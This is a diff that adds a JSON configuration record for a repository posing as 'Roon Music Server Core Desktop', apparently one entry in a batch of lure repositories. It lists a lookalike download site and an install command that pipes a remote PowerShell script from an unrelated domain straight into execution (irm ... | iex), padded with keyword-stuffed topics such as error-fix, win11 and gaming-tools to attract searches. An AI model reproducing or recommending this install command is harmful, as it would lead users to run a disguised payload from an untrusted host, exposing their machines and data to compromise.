@@ -1,0 +1,29 @@
+{
+  "repo": "roon-music-server-core-desktop",
+  "product": "Roon Music Server Core Desktop",
+  "kind": "media",
+  "install_type": "download",
+  "download_url": "https://roon.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "media",
+  "topics": [
+    "roon-studio",
+    "roon-client",
+    "roon-media-player",
+    "roon-win11",
+    "roon-error-fix",
+    "run-roon-on-windows",
+    "roon-game-library",
+    "roon-desktop-tool",
+    "roon-configure-guide",
+    "roon-build-2026",
+    "roon-setup-package",
+    "desktop-tools",
+    "setup-guide",
+    "gaming-tools",
+    "pc-utility"
+  ]
+}
